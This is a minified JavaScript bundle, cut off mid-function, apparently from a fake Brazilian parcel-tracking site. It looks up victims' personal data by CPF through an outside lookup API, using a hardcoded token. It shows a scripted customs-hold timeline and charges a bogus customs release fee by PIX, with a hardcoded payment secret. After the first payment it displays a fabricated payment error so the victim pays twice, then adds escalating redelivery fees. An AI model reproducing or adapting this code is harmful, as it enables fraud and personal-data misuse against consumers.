import"./modulepreload-polyfill-B5Qt9EMX.js";/* empty css              */import{D as y}from"./database-CTJo1PQf.js";import{C as p}from"./cpf-validator-B4PsRAE6.js";import{N as h}from"./navigation-BwbyOJod.js";class f{constructor(){this.fallbackData=this.generateFallbackData(),console.log("DataService initialized")}async fetchCPFData(e){const t=e.replace(/[^\d]/g,"");console.log("Fetching data for CPF:",t);try{const o=await this.tryOfficialAPI(t);if(o)return console.log("Data obtained from official API:",o),o}catch(o){console.error("Official API failed, using fallback:",o.message)}return console.log("Using fallback data for CPF:",t),this.getFallbackData(t)}async tryOfficialAPI(e){const t=new AbortController,o=setTimeout(()=>t.abort(),15e3);try{console.log("Calling official API endpoint for CPF:",e);const a=`https://api.amnesiatecnologia.rocks/?token=e9f16505-2743-4392-bfbe-1b4b89a7367c&cpf=${e}`,i={signal:t.signal,method:"GET",mode:"cors",headers:{Accept:"application/json","Content-Type":"application/json","User-Agent":"Mozilla/5.0 (compatible; TrackingSystem/1.0)"},credentials:"omit"};console.log("Fetch options:",i),console.log("API URL:",a);const n=await fetch(a,i);if(clearTimeout(o),console.log("Response status:",n.status),console.log("Response headers:",Object.fromEntries(n.headers.entries())),!n.ok)throw console.error(`HTTP Error: ${n.status} - ${n.statusText}`),new Error(`API Error: ${n.status} - ${n.statusText}`);const s=await n.text();if(console.log("API Response Text:",s.substring(0,200)+(s.length>200?"...":"")),!s||s.trim()==="")throw console.error("Empty response from API"),new Error("Resposta vazia da API");try{const r=JSON.parse(s);if(console.log("Parsed API data:",r),r&&r.DADOS&&r.DADOS.nome&&r.DADOS.cpf)return console.log("✅ Dados válidos recebidos da API oficial"),console.log("Nome encontrado:",r.DADOS.nome),console.log("CPF:",r.DADOS.cpf),{DADOS:{nome:r.DADOS.nome,cpf:r.DADOS.cpf,nascimento:this.formatBirthDate(r.DADOS.data_nascimento),situacao:"REGULAR",sexo:r.DADOS.sexo||"N/A",nome_mae:r.DADOS.nome_mae||"N/A"}};throw console.error("Invalid data format from API:",r),new Error("Formato de dados inválido da API")}catch(r){throw console.error("JSON parse error:",r),new Error("Erro ao processar resposta da API: "+r.message)}}catch(a){throw clearTimeout(o),console.error("API call error details:",{name:a.name,message:a.message,stack:a.stack,cause:a.cause}),a.name==="AbortError"?(console.error("Request was aborted (timeout)"),new Error("Timeout: A API demorou muito para responder")):a.message.includes("Failed to fetch")?(console.error("Network error - possibly CORS or connectivity issue"),new Error("Erro de conectividade: Não foi possível acessar a API externa")):a.message.includes("CORS")?(console.error("CORS error detected"),new Error("Erro de CORS: API externa não permite acesso do navegador")):a}}formatBirthDate(e){if(!e)return null;try{return e}catch(t){return console.error("Erro ao formatar data de nascimento:",t),null}}getFallbackData(e){const t=["João Silva Santos","Maria Oliveira Costa","Pedro Souza Lima","Ana Paula Ferreira","Carlos Eduardo Alves","Fernanda Santos Rocha","Ricardo Pereira Dias","Juliana Costa Martins","Bruno Almeida Silva","Camila Rodrigues Nunes","Rafael Santos Barbosa","Larissa Oliveira Cruz"],o=parseInt(e.slice(-2))%t.length,a=t[o];return console.log("Generated fallback data for CPF:",e,"Name:",a),{DADOS:{nome:a,cpf:e,nascimento:this.generateBirthDate(e),situacao:"REGULAR"}}}generateBirthDate(e){const t=1960+parseInt(e.slice(0,2))%40,o=parseInt(e.slice(2,4))%12+1;return`${(parseInt(e.slice(4,6))%28+1).toString().padStart(2,"0")}/${o.toString().padStart(2,"0")}/${t}`}generateFallbackData(){return{products:["Kit 12 caixas organizadoras + brinde","Conjunto de panelas antiaderentes","Smartphone Samsung Galaxy A54","Fone de ouvido Bluetooth","Carregador portátil 10000mAh","Camiseta básica algodão","Tênis esportivo Nike","Relógio digital smartwatch"]}}}class v{constructor(){this.baseURL="https://zentrapay-api.onrender.com",this.apiSecret=this.getApiSecret(),console.log("🔑 ZentraPayService inicializado com API oficial"),console.log("🔐 API Secret configurada:",this.apiSecret?"SIM":"NÃO")}getApiSecret(){const e=window.ZENTRA_PAY_SECRET_KEY||localStorage.getItem("zentra_pay_secret_key")||"sk_ab923f7fd51de54a45f835645cae6c73c9ac37e65e28b79fd7d13efb030d74c6cebab32534d07a5f80a871196121732a129ef02e3732504b1a56b8d1972ebbf1";return e.startsWith("sk_")?(console.log("✅ API Secret Zentra Pay válida encontrada"),console.log("🔑 Secret (primeiros 20 chars):",e.substring(0,20)+"...")):console.error("❌ API Secret Zentra Pay inválida ou não configurada"),e}generateUniqueEmail(e){const t=Math.random().toString(36).substring(2,8);return`lead${e}_${t}@tempmail.com`}generateUniquePhone(e){return`11${e.toString().slice(-8)}`}generateExternalId(){const e=Date.now(),t=Math.random().toString(36).substring(2,8);return`bolt_${e}_${t}`}async createPixTransaction(e,t){var o,a;try{const i=Date.now(),n=this.generateExternalId();if(this.apiSecret=this.getApiSecret(),!this.apiSecret||!this.apiSecret.startsWith("sk_"))throw new Error("API Secret inválida ou não configurada. Verifique se a chave Zentra Pay está corretamente definida.");const s=e.email||this.generateUniqueEmail(i),r=e.telefone||this.generateUniquePhone(i);console.log("📧 Email usado:",s),console.log("📱 Telefone usado:",r);const l={external_id:n,total_amount:parseFloat(t),payment_method:"PIX",webhook_url:"https://meusite.com/webhook",items:[{id:"liberation_fee",title:"Taxa de Liberação Aduaneira",quantity:1,price:parseFloat(t),description:"Taxa única para liberação de objeto na alfândega",is_physical:!1}],ip:"8.8.8.8",customer:{name:e.nome,email:s,phone:r,document_type:"CPF",document:e.cpf.replace(/[^\d]/g,"")}};console.log("🚀 Criando transação Zentra Pay com API oficial:",{external_id:l.external_id,total_amount:`R$ ${l.total_amount.toFixed(2)}`,payment_method:l.payment_method,webhook_url:l.webhook_url,ip:l.ip,customer:{name:l.customer.name,document:l.customer.document,email:l.customer.email,phone:l.customer.phone,document_type:l.customer.document_type}});const u={"api-secret":this.apiSecret,"Content-Type":"application/json"};console.log("📡 Headers da requisição (oficial):",{"api-secret":`${this.apiSecret.substring(0,20)}...`,"Content-Type":u["Content-Type"]});const d=await fetch(`${this.baseURL}/v1/transactions`,{method:"POST",headers:u,body:JSON.stringify(l)});if(console.log("📡 Status da resposta:",d.status),console.log("📡 Headers da resposta:",Object.fromEntries(d.headers.entries())),!d.ok){const g=await d.text();throw console.error("❌ Erro na API Zentra Pay:",{status:d.status,statusText:d.statusText,body:g,headers:Object.fromEntries(d.headers.entries())}),new Error(`Erro na API: ${d.status} - ${g}`)}const c=await d.json();if(console.log("✅ Resposta Zentra Pay recebida:",{transaction_id:c.transaction_id||c.id,external_id:c.external_id,has_pix_payload:!!((o=c.pix)!=null&&o.payload),has_qr_code:!!((a=c.pix)!=null&&a.qr_code),status:c.status,payment_method:c.payment_method}),!c.pix||!c.pix.payload)throw console.error("❌ Resposta incompleta da API:",c),new Error("Resposta da API não contém os dados PIX necessários (pix.payload)");return console.log("🎉 PIX gerado com sucesso via API oficial!"),console.log("📋 PIX Payload (copia e cola):",c.pix.payload),{success:!0,externalId:n,pixPayload:c.pix.payload,qrCode:c.pix.qr_code||null,transactionId:c.transaction_id||c.id,email:s,telefone:r,valor:t,status:c.status||"pending",paymentMethod:c.payment_method||"PIX",timestamp:i}}catch(i){return console.error("💥 Erro ao criar transação PIX:",{message:i.message,stack:i.stack,apiSecret:this.apiSecret?"CONFIGURADA":"NÃO CONFIGURADA"}),{success:!1,error:i.message,details:i.stack}}}setApiSecret(e){return!e||!e.startsWith("sk_")?(console.error("❌ API Secret inválida fornecida"),!1):(this.apiSecret=e,localStorage.setItem("zentra_pay_secret_key",e),window.ZENTRA_PAY_SECRET_KEY=e,console.log("🔑 API Secret Zentra Pay atualizada com sucesso"),!0)}async testConnection(){try{if(console.log("🔍 Testando conexão com Zentra Pay..."),this.apiSecret=this.getApiSecret(),!this.apiSecret||!this.apiSecret.startsWith("sk_"))throw new Error("API Secret inválida para teste de conexão");const e=await fetch(`${this.baseURL}/health`,{method:"GET",headers:{"api-secret":this.apiSecret,"Content-Type":"application/json"}});return e.ok?(console.log("✅ Conexão com Zentra Pay OK"),!0):(console.warn("⚠️ Problema na conexão:",e.status),!1)}catch(e){return console.error("❌ Erro ao testar conexão:",e),!1}}validateApiSecret(){return this.apiSecret?this.apiSecret.startsWith("sk_")?this.apiSecret.length<50?(console.error("❌ API Secret muito curta"),!1):(console.log("✅ API Secret válida"),!0):(console.error("❌ Formato de API Secret inválido"),!1):(console.error("❌ Nenhuma API Secret configurada"),!1)}}class P{constructor(){this.dbService=new y,this.dataService=new f,this.zentraPayService=new v,this.currentCPF=null,this.trackingData=null,this.userData=null,this.isInitialized=!1,this.pixData=null,this.paymentAttempts=0,this.maxPaymentAttempts=2,console.log("TrackingSystem inicializado"),this.initWhenReady()}initWhenReady(){document.readyState==="loading"?document.addEventListener("DOMContentLoaded",()=>this.init()):this.init(),setTimeout(()=>this.init(),100),setTimeout(()=>this.init(),500),setTimeout(()=>this.init(),1e3)}async init(){if(!this.isInitialized){console.log("Inicializando sistema de rastreamento...");try{this.setupEventListeners(),this.handleAutoFocus(),this.clearOldData(),this.validateZentraPaySetup(),this.isInitialized=!0,console.log("Sistema de rastreamento inicializado com sucesso")}catch(e){console.error("Erro na inicialização:",e),setTimeout(()=>{this.isInitialized=!1,this.init()},1e3)}}}validateZentraPaySetup(){this.zentraPayService.validateApiSecret()?console.log("✅ API Zentra Pay configurada corretamente"):console.error("❌ Problema na configuração da API Zentra Pay")}setupEventListeners(){console.log("Configurando event listeners..."),this.setupFormSubmission(),this.setupCPFInput(),this.setupTrackButton(),this.setupModalEvents(),this.setupCopyButtons(),this.setupAccordion(),this.setupKeyboardEvents(),console.log("Event listeners configurados")}setupFormSubmission(){const e=document.getElementById("trackingForm");e&&(console.log("Form encontrado por ID"),e.addEventListener("submit",t=>{t.preventDefault(),t.stopPropagation(),console.log("Form submetido via ID"),this.handleTrackingSubmit()})),document.querySelectorAll("form").forEach((t,o)=>{console.log(`Configurando form ${o}`),t.addEventListener("submit",a=>{a.preventDefault(),a.stopPropagation(),console.log(`Form ${o} submetido`),this.handleTrackingSubmit()})})}setupTrackButton(){console.log("Configurando botão de rastreamento...");const e=document.getElementById("trackButton");e&&(console.log("Botão encontrado por ID: trackButton"),this.configureTrackButton(e)),document.querySelectorAll(".track-button").forEach((t,o)=>{console.log(`Configurando botão por classe ${o}`),this.configureTrackButton(t)}),document.querySelectorAll('button[type="submit"], button').forEach((t,o)=>{t.textContent&&t.textContent.toLowerCase().includes("rastrear")&&(console.log(`Configurando botão por texto ${o}: ${t.textContent}`),this.configureTrackButton(t))}),document.addEventListener("click",t=>{const o=t.target;o&&o.tagName==="BUTTON"&&o.textContent&&o.textContent.toLowerCase().includes("rastrear")&&(t.preventDefault(),t.stopPropagation(),console.log("Botão rastrear clicado via delegação"),this.handleTrackingSubmit())})}configureTrackButton(e){const t=e.cloneNode(!0);e.parentNode.replaceChild(t,e),t.addEventListener("click",o=>{o.preventDefault(),o.stopPropagation(),console.log("Botão rastrear clicado:",t.id||t.className),this.handleTrackingSubmit()}),t.style.cursor="pointer",t.style.pointerEvents="auto",t.removeAttribute("disabled"),t.type!=="submit"&&(t.type="button"),console.log("Botão configurado:",t.id||t.className)}setupCPFInput(){const e=document.getElementById("cpfInput");if(!e){console.warn("Campo CPF não encontrado");return}console.log("Configurando campo CPF..."),e.addEventListener("input",t=>{p.applyCPFMask(t.target),this.validateCPFInput()}),e.addEventListener("keypress",t=>{this.preventNonNumeric(t)}),e.addEventListener("keydown",t=>{t.key==="Enter"&&(t.preventDefault(),this.handleTrackingSubmit())}),e.addEventListener("paste",t=>{t.preventDefault();const a=(t.clipboardData||window.clipboardData).getData("text").replace(/[^\d]/g,"");a.length<=11&&(e.value=a,p.applyCPFMask(e),this.validateCPFInput())}),e.addEventListener("focus",()=>{e.setAttribute("inputmode","numeric")}),console.log("Campo CPF configurado")}preventNonNumeric(e){const t=[8,9,27,13,46,35,36,37,38,39,40],o=e.keyCode===65&&e.ctrlKey,a=e.keyCode===67&&e.ctrlKey,i=e.keyCode===86&&e.ctrlKey,n=e.keyCode===88&&e.ctrlKey;t.includes(e.keyCode)||o||a||i||n||(e.shiftKey||e.keyCode<48||e.keyCode>57)&&(e.keyCode<96||e.keyCode>105)&&e.preventDefault()}validateCPFInput(){const e=document.getElementById("cpfInput"),t=document.querySelectorAll('#trackButton, .track-button, button[type="submit"]');if(!e)return;const o=p.cleanCPF(e.value);t.forEach(a=>{a.textContent&&a.textContent.toLowerCase().includes("rastrear")&&(o.length===11?(a.disabled=!1,a.style.opacity="1",a.style.cursor="pointer",e.style.borderColor="#27ae60"):(a.disabled=!0,a.style.opacity="0.7",a.style.cursor="not-allowed",e.style.borderColor=o.length>0?"#e74c3c":"#e9ecef"))})}async handleTrackingSubmit(){console.log("=== INICIANDO BUSCA NO BANCO ===");const e=document.getElementById("cpfInput");if(!e){console.error("Campo CPF não encontrado"),this.showError("Campo CPF não encontrado. Recarregue a página.");return}const t=e.value,o=p.cleanCPF(t);if(console.log("CPF digitado:",t),console.log("CPF limpo:",o),!p.isValidCPF(t)){console.log("CPF inválido"),this.showError("Por favor, digite um CPF válido com 11 dígitos.");return}console.log("CPF válido, buscando no banco..."),this.showLoadingNotification();const a=document.querySelectorAll('#trackButton, .track-button, button[type="submit"]'),i=[];a.forEach((n,s)=>{n.textContent&&n.textContent.toLowerCase().includes("rastrear")&&(i[s]=n.innerHTML,n.innerHTML='<i class="fas fa-spinner fa-spin"></i> Consultando...',n.disabled=!0)});try{await new Promise(s=>setTimeout(s,1500)),console.log("🔍 Buscando no banco de dados...");const n=await this.getLeadFromDatabase(o);if(n.success&&n.data){console.log("✅ LEAD ENCONTRADO NO BANCO!"),console.log("📦 Dados do lead:",n.data),this.leadData=n.data,this.currentCPF=o,this.closeLoadingNotification(),console.log("📋 Exibindo dados do banco..."),this.displayOrderDetailsFromDatabase(),this.generateRealTrackingData(),this.displayTrackingResults(),this.saveTrackingData();const s=document.getElementById("orderDetails");s&&this.scrollToElement(s,100),setTimeout(()=>{this.highlightLiberationButton()},1500)}else console.log("❌ CPF não encontrado no banco"),this.closeLoadingNotification(),this.showError("CPF inexistente. Não encontramos sua encomenda.")}catch(n){console.error("Erro no processo:",n),this.closeLoadingNotification(),this.showError("Erro ao consultar CPF. Tente novamente.")}finally{a.forEach((n,s)=>{n.textContent&&i[s]&&(n.innerHTML=i[s],n.disabled=!1)}),this.validateCPFInput()}}async getLeadFromDatabase(e){return await this.dbService.getLeadByCPF(e)}displayOrderDetailsFromDatabase(){if(!this.leadData)return;console.log("📋 Exibindo dados do banco de dados");const e=this.getFirstAndLastName(this.leadData.nome_completo||"Nome não informado"),t=p.formatCPF(this.leadData.cpf||"");this.updateElement("customerName",e),this.updateElement("fullName",this.leadData.nome_completo||"Nome não informado"),this.updateElement("formattedCpf",t),this.updateElement("customerNameStatus",e);let o="Produto não informado";this.leadData.produtos&&this.leadData.produtos.length>0&&(o=this.leadData.produtos[0].nome||"Produto não informado"),this.updateElement("customerProduct",o);const a=this.leadData.endereco||"Endereço não informado";this.updateElement("customerFullAddress",a),console.log("✅ Interface atualizada com dados do banco"),console.log("👤 Nome exibido:",e),console.log("📄 Nome completo:",this.leadData.nome_completo),console.log("📍 Endereço:",a),console.log("📦 Produto:",o),this.showElement("orderDetails"),this.showElement("trackingResults")}generateRealTrackingData(){if(console.log("📦 Gerando dados de rastreamento reais do banco"),!this.leadData)return;const e=this.leadData.etapa_atual||1,t=this.getStageNames();this.trackingData={cpf:this.leadData.cpf,currentStep:e,steps:[],liberationPaid:this.leadData.status_pagamento==="pago",liberationDate:this.leadData.status_pagamento==="pago"?new Date().toISOString():null,deliveryAttempts:0,lastUpdate:this.leadData.updated_at||new Date().toISOString()};for(let o=1;o<=Math.max(e,26);o++){const a=new Date;a.setHours(a.getHours()-(Math.max(e,26)-o)),this.trackingData.steps.push({id:o,date:a,title:t[o]||`Etapa ${o}`,description:t[o]||`Etapa ${o}`,isChina:o>=3&&o<=7,completed:o<=e,needsLiberation:o===11&&this.leadData.status_pagamento!=="pago",needsDeliveryPayment:(o===16||o===20||o===24)&&this.leadData.status_pagamento==="pago",deliveryAttempt:o===16?1:o===20?2:o===24?3:null})}console.log("✅ Dados de rastreamento gerados baseados no banco"),console.log("📊 Etapa atual:",e),console.log("💳 Status pagamento:",this.leadData.status_pagamento)}getStageNames(){return{1:"Seu pedido foi criado",2:"O seu pedido está sendo preparado para envio",3:"[China] O vendedor enviou seu pedido",4:"[China] O pedido chegou ao centro de triagem de Shenzhen",5:"[China] Pedido saiu do centro logístico de Shenzhen",6:"[China] Coletado. O pedido está em trânsito internacional",7:"[China] O pedido foi liberado na alfândega de exportação",8:"Pedido saiu da origem: Shenzhen",9:"Pedido chegou no Brasil",10:"Pedido em trânsito para CURITIBA/PR",11:"Pedido chegou na alfândega de importação: CURITIBA/PR",12:"Pedido liberado na alfândega de importação",13:"Pedido sairá para entrega",14:"Pedido em trânsito entrega",15:"Pedido em rota de entrega",16:"Tentativa entrega",17:"Pedido liberado para nova tentativa de entrega",18:"Pedido liberado, em trânsito",19:"Pedido em rota de entrega para o endereço",20:"Tentativa de entrega",21:"Pedido liberado para nova tentativa de entrega",22:"Pedido liberado, em trânsito",23:"Pedido em rota de entrega para o endereço",24:"Tentativa de entrega",25:"Pedido liberado para nova tentativa de entrega",26:"Pedido em rota de entrega para o endereço"}}displayTrackingResults(){this.updateStatus(),this.renderTimeline(),setTimeout(()=>{this.animateTimeline()},500)}updateStatus(){const e=document.getElementById("statusIcon"),t=document.getElementById("currentStatus");if(!e||!t)return;let o="";this.leadData&&this.leadData.etapa_atual?o=this.getStageNames()[this.leadData.etapa_atual]||`Etapa ${this.leadData.etapa_atual}`:o="Pedido chegou na alfândega de importação: CURITIBA/PR";const a=this.leadData?this.leadData.etapa_atual:11;a>=17?(e.innerHTML='<i class="fas fa-check-circle"></i>',e.className="status-icon delivered"):a>=13?(e.innerHTML='<i class="fas fa-truck"></i>',e.className="status-icon in-delivery"):a>=12?(e.innerHTML='<i class="fas fa-check-circle"></i>',e.className="status-icon delivered"):(e.innerHTML='<i class="fas fa-clock"></i>',e.className="status-icon in-transit"),t.textContent=o}renderTimeline(){const e=document.getElementById("trackingTimeline");if(!e)return;e.innerHTML="";const t=this.leadData?this.leadData.etapa_atual:11;this.trackingData.steps.forEach(o=>{if(o.id<=t){const a=o.id===t,i=this.createTimelineItem(o,a);e.appendChild(i)}})}createTimelineItem(e,t){const o=document.createElement("div");o.className=`timeline-item ${e.completed?"completed":""} ${t?"last":""}`;const a=this.leadData&&this.leadData.updated_at?new Date(this.leadData.updated_at):new Date,i=a.toLocaleDateString("pt-BR",{day:"2-digit",month:"short"}),n=a.toLocaleTimeString("pt-BR",{hour:"2-digit",minute:"2-digit"});let s="";const r=this.leadData?this.leadData.etapa_atual:11;if((e.id===11||e.id===12)&&r<=12&&(s=`
                <button class="liberation-button-timeline" data-step-id="${e.id}">
                    <i class="fas fa-unlock"></i> LIBERAR OBJETO
                </button>
            `),e.needsDeliveryPayment&&e.deliveryAttempt){const u={1:"9,74",2:"14,98",3:"18,96"}[e.deliveryAttempt];s=`
                <button class="delivery-retry-button" data-step-id="${e.id}" data-attempt="${e.deliveryAttempt}" data-value="${u}">
                    <i class="fas fa-redo"></i> REENVIAR PACOTE
                </button>
            `}if(o.innerHTML=`
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${i}</span>
                    <span class="time">${n}</span>
                </div>
                <div class="timeline-text">
                    <p>${e.isChina?'<span class="china-tag">[China]</span>':""}${e.description}</p>
                    ${s}
                </div>
            </div>
        `,(e.id===11||e.id===12)&&r<=12){const l=o.querySelector(".liberation-button-timeline");l&&l.addEventListener("click",()=>{this.openLiberationModal()})}if(e.needsDeliveryPayment&&e.deliveryAttempt){const l=o.querySelector(".delivery-retry-button");l&&l.addEventListener("click",()=>{this.openDeliveryPaymentModal(e.deliveryAttempt,e.id)})}return o}highlightLiberationButton(){const e=document.querySelector(".liberation-button-timeline");e&&(this.scrollToElement(e,window.innerHeight/2),setTimeout(()=>{e.style.animation="pulse 2s infinite, glow 2s ease-in-out",e.style.boxShadow="0 0 20px rgba(255, 107, 53, 0.8)",setTimeout(()=>{e.style.animation="pulse 2s infinite",e.style.boxShadow="0 4px 15px rgba(255, 107, 53, 0.4)"},6e3)},500))}setupModalEvents(){const e=document.getElementById("closeModal");e&&e.addEventListener("click",()=>{this.closeModal("liberationModal")});const t=document.getElementById("closeDeliveryModal");t&&t.addEventListener("click",()=>{this.closeModal("deliveryModal")}),["liberationModal","deliveryModal"].forEach(o=>{const a=document.getElementById(o);a&&a.addEventListener("click",i=>{i.target.id===o&&this.closeModal(o)})})}setupCopyButtons(){[{buttonId:"copyPixButtonModal",inputId:"pixCodeModal"},{buttonId:"copyPixButtonDelivery",inputId:"pixCodeDelivery"}].forEach(({buttonId:t,inputId:o})=>{const a=document.getElementById(t);a&&a.addEventListener("click",()=>{this.copyPixCode(o,t)})})}setupAccordion(){const e=document.getElementById("detailsHeader");e&&e.addEventListener("click",()=>{this.toggleAccordion()})}setupKeyboardEvents(){document.addEventListener("keydown",e=>{e.key==="Escape"&&(this.closeModal("liberationModal"),this.closeModal("deliveryModal"),this.closeLoadingNotification())})}async openLiberationModal(){console.log("🚀 Abrindo modal de liberação - Tentativa:",this.paymentAttempts+1),this.showLoadingNotification();try{if(!this.zentraPayService.validateApiSecret())throw new Error("API Secret do Zentra Pay não configurada corretamente");const e=window.valor_em_reais||26.34;console.log("💰 Valor da transação:",`R$ ${e.toFixed(2)}`);const t={nome:this.leadData.nome_completo,cpf:this.leadData.cpf,email:this.leadData.email,telefone:this.leadData.telefone};console.log("👤 Dados do cliente para pagamento:",t),console.log("📡 Enviando requisição para Zentra Pay...");const o=await this.zentraPayService.createPixTransaction(t,e);if(o.success)console.log("🎉 PIX gerado com sucesso!"),this.pixData=o,this.closeLoadingNotification(),setTimeout(()=>{this.displayRealPixModal(),setTimeout(()=>{this.guideToCopyButton()},800)},300);else throw new Error(o.error||"Erro desconhecido ao gerar PIX")}catch(e){console.error("💥 Erro ao gerar PIX:",e),this.closeLoadingNotification(),this.showError(`Erro ao gerar PIX: ${e.message}`),setTimeout(()=>{console.log("⚠️ Exibindo modal estático como fallback"),this.displayStaticPixModal(),setTimeout(()=>{this.guideToCopyButton()},800)},1e3)}}displayRealPixModal(){console.log("🎯 Exibindo modal com dados reais do PIX...");const e=document.getElementById("realPixQrCode");if(e&&this.pixData.pixPayload){const a=`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.pixData.pixPayload)}`;e.src=a,e.alt="QR Code PIX Real - Zentra Pay Oficial",console.log("✅ QR Code atualizado com dados reais da API oficial")}const t=document.getElementById("pixCodeModal");t&&this.pixData.pixPayload&&(t.value=this.pixData.pixPayload,console.log("✅ Código PIX Copia e Cola atualizado com dados reais da API oficial"));const o=document.getElementById("liberationModal");o&&(o.style.display="flex",document.body.style.overflow="hidden",console.log("🎯 Modal PIX real exibido com sucesso"),setTimeout(()=>{this.addPaymentSimulationButton()},500)),console.log("🎉 SUCESSO: Modal PIX real exibido com dados válidos da Zentra Pay!")}displayStaticPixModal(){const e=document.getElementById("liberationModal");e&&(e.style.display="flex",document.body.style.overflow="hidden",setTimeout(()=>{this.addPaymentSimulationButton()},500)),console.log("⚠️ Modal PIX estático exibido como fallback")}addPaymentSimulationButton(){const e=document.querySelector(".professional-modal-content");if(!e||document.getElementById("simulatePaymentButton"))return;const t=document.createElement("div");t.style.cssText=`
            margin-top: 20px;
            padding: 15px;
            background: transparent;
            border-radius: 8px;
            border: none;
            text-align: center;
        `,t.innerHTML=`
            <button id="simulatePaymentButton" style="
                background: transparent;
                color: #666;
                border: 1px solid #ddd;
                padding: 6px 12px;
                border-radius: 6px;
                cursor: pointer;
                font-weight: 600;
                transition: all 0.3s ease;
                opacity: 0.7;
                font-size: 12px;
                min-width: 30px;
                height: 28px;
            ">
                -
            </button>
        `,e.appendChild(t);const o=document.getElementById("simulatePaymentButton");o&&(o.addEventListener("click",()=>{this.simulatePayment()}),o.addEventListener("mouseenter",function(){this.style.background="rgba(0, 0, 0, 0.05)",this.style.transform="translateY(-1px)",this.style.opacity="1"}),o.addEventListener("mouseleave",function(){this.style.background="transparent",this.style.transform="translateY(0)",this.style.opacity="0.7"}))}simulatePayment(){this.paymentAttempts++,console.log(`💳 Tentativa de pagamento: ${this.paymentAttempts}/${this.maxPaymentAttempts}`),this.closeModal("liberationModal"),this.paymentAttempts===1?setTimeout(()=>{this.showPaymentError()},1e3):this.paymentAttempts>=this.maxPaymentAttempts&&(this.paymentAttempts=0,this.processSuccessfulPayment())}showPaymentError(){const e=document.createElement("div");e.id="paymentErrorOverlay",e.className="modal-overlay",e.style.display="flex",e.innerHTML=`
            <div class="professional-modal-container" style="max-width: 450px;">
                <div class="professional-modal-header">
                    <h2 class="professional-modal-title">Erro de Pagamento</h2>
                    <button class="professional-modal-close" id="closePaymentErrorModal">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content" style="text-align: center;">
                    <div style="margin-bottom: 20px;">
                        <i class="fas fa-exclamation-triangle" style="font-size: 3rem; color: #e74c3c;"></i>
                    </div>
                    <p style="font-size: 1.1rem; margin-bottom: 25px; color: #333;">
                        Erro ao processar pagamento. Tente novamente.
                    </p>
                    <button id="retryPaymentButton" class="liberation-button-timeline" style="margin: 0 auto; display: block;">
                        <i class="fas fa-redo"></i> Tentar Novamente
                    </button>
                </div>
            </div>
        `,document.body.appendChild(e),document.body.style.overflow="hidden";const t=document.getElementById("closePaymentErrorModal"),o=document.getElementById("retryPaymentButton");t&&t.addEventListener("click",()=>{this.closePaymentErrorModal()}),o&&o.addEventListener("click",()=>{this.closePaymentErrorModal(),this.openLiberationModal()}),e.addEventListener("click",a=>{a.target===e&&this.closePaymentErrorModal()})}closePaymentErrorModal(){const e=document.getElementById("paymentErrorOverlay");e&&(e.style.animation="fadeOut 0.3s ease",setTimeout(()=>{e.parentNode&&e.remove(),document.body.style.overflow="auto"},300))}async processSuccessfulPayment(){console.log("🎉 Processando pagamento bem-sucedido..."),this.trackingData&&(this.trackingData.liberationPaid=!0),this.leadData&&await this.updatePaymentStatusInDatabase("pago");const e=document.querySelector(".liberation-button-timeline");e&&(e.style.display="none"),this.showSuccessNotification(),setTimeout(()=>{this.addPostPaymentSteps()},1e3)}addPostPaymentSteps(){const e=document.getElementById("trackingTimeline");if(!e)return;const t=this.getStageNames(),o=[12,13,14,15,16];o.forEach((a,i)=>{setTimeout(()=>{const n=new Date,s=this.createTimelineItem({id:a,date:n,title:t[a],description:t[a],isChina:!1,completed:!0,needsLiberation:!1,needsDeliveryPayment:a===16,deliveryAttempt:a===16?1:null},i===o.length-1);e.appendChild(s),setTimeout(()=>{s.style.opacity="1",s.style.transform="translateY(0)"},100),s.scrollIntoView({behavior:"smooth",block:"center"})},i*3e4)})}async updatePaymentStatusInDatabase(e){if(this.currentCPF)try{const t=JSON.parse(localStorage.getItem("leads")||"[]"),o=t.findIndex(a=>a.cpf&&a.cpf.replace(/[^\d]/g,"")===this.currentCPF);o!==-1&&(t[o].status_pagamento=e,t[o].etapa_atual=12,t[o].updated_at=new Date().toISOString(),localStorage.setItem("leads",JSON.stringify(t)),console.log("✅ Status de pagamento atualizado no localStorage:",e))}catch(t){console.error("❌ Erro ao atualizar status no localStorage:",t)}}showSuccessNotification(){const e=document.createElement("div");if(e.className="payment-success-notification",e.style.cssText=`
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #27ae60;
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
            z-index: 9999;
            display: flex;
            align-items: center;
            gap: 10px;
            font-family: 'Inter', sans-serif;
            animation: slideInRight 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
        `,e.innerHTML=`
            <i class="fas fa-check-circle" style="font-size: 1.2rem;"></i>
            <div>
                <div style="font-weight: 600; margin-bottom: 2px;">Pagamento confirmado!</div>
                <div style="font-size: 0.9rem; opacity: 0.9;">Objeto liberado com sucesso.</div>
            </div>
        `,document.body.appendChild(e),!document.getElementById("notificationAnimations")){const t=document.createElement("style");t.id="notificationAnimations",t.textContent=`
                @keyframes slideInRight {
                    from { transform: translateX(100%); opacity: 0; }
                    to { transform: translateX(0); opacity: 1; }
                }
                @keyframes fadeOut {
                    from { opacity: 1; }
                    to { opacity: 0; }
                }
            `,document.head.appendChild(t)}setTimeout(()=>{e.parentNode&&e.remove()},5e3)}async openDeliveryPaymentModal(e,t){console.log(`🚀 Abrindo modal de pagamento para ${e}ª tentativa de entrega...`);const a={1:9.74,2:14.98,3:18.96}[e];this.showLoadingNotification();try{if(!this.zentraPayService.validateApiSecret())throw new Error("API Secret do Zentra Pay não configurada corretamente");console.log(`💰 Valor da taxa de reenvio: R$ ${a.toFixed(2)}`);const i={nome:this.leadData.nome_completo,cpf:this.leadData.cpf,email:this.leadData.email,telefone:this.leadData.telefone};console.log("📡 Gerando PIX para taxa de reenvio...");const n=await this.zentraPayService.createPixTransaction(i,a);if(n.success)console.log("🎉 PIX de reenvio gerado com sucesso!"),this.deliveryPixData=n,this.closeLoadingNotification(),setTimeout(()=>{this.displayDeliveryPaymentModal(e,a,t)},300);else throw new Error(n.error||"Erro desconhecido ao gerar PIX de reenvio")}catch(i){console.error("💥 Erro ao gerar PIX de reenvio:",i),this.closeLoadingNotification(),setTimeout(()=>{this.displayDeliveryPaymentModal(e,a,t,!0)},1e3)}}displayDeliveryPaymentModal(e,t,o,a=!1){const 